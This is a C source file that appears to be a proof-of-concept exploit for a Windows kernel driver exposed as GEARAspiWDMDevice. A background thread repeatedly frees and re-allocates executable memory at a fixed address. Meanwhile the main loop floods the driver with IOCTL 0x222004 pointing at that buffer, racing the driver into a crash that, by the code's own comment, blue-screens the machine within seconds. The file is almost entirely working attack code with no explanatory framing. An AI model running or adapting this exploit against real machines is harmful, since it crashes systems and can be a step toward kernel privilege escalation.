#include <Windows.h>
#include <stdio.h>

void memSwitchThread(LPVOID lpMemoryArea) {
  BOOL bResult;
  for (;;) { // Infinite loop
    bResult = VirtualFree(lpMemoryArea, 0, MEM_RELEASE);
    if (bResult != 0) {
      lpMemoryArea = VirtualAlloc((LPVOID)0x41000000, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      if (lpMemoryArea == NULL) {
        printf("[!] Thread failed on VirtualAllocn\n"); // All APIs need to succeed
        return(-1);
      }
    }
    else {
      printf("[!] Thread failed on VirtualFree\n");
      printf("Get last error: 0x%X\n", GetLastError());
      return(-1);
    }
  }
  return 0; // Should never reach here
}

int main(int argc, char* argv[]) {
  HANDLE hDriver = CreateFileW(L"\\\\.\\GEARAspiWDMDevice", GENERIC_READ | GENERIC_WRITE, 0,
    NULL, OPEN_EXISTING, 0, NULL); // Get a handle to the driver
  if (hDriver != INVALID_HANDLE_VALUE) {
    printf("[i] Found driver\n");
    LPVOID lpMemoryArea = VirtualAlloc((LPVOID)0x41000000, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("LPMemoryArea = %I64X\n", lpMemoryArea);
    if (lpMemoryArea == NULL) {
      printf("[!] Unable to allocate memory\n");
      return(-1);
    }
    else {
      printf("[i]Allocated memory @ 0x%08X, of %d bytes\n", lpMemoryArea, 0x10000);
    }
    DWORD dwBytesOut = 0;
    DWORD dwThreadId = 0;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memSwitchThread, lpMemoryArea, 0, &dwThreadId);
    printf("[i] Sending IOCTL(S) with buffer\n");
    DWORD dwIoctl = 0x222004;
    /*
    Both the following loop and the loop inside the above thread will continiously execute
    Within a couple of seconds you will get a BSoD
    */
    for (;;) {
      // nOutBufferSize must be greater than or equal to 0x48
      // nInBufferSize can really be anything
      DeviceIoControl(hDriver, dwIoctl, lpMemoryArea, 0x478, lpMemoryArea, 0x48, &dwBytesOut, NULL);
      //printf("[i] SENT IOCTL: %X RETURN VALUE: %X\n", dwIoctl, GetLastError()); // Debug
    }
    printf("How did we get here?\n");
    return(-1);
  }
  else {
    printf("[!] Unable to get a HANDLE on the driver\n");
    return(-1);
  }
  return(0);
}
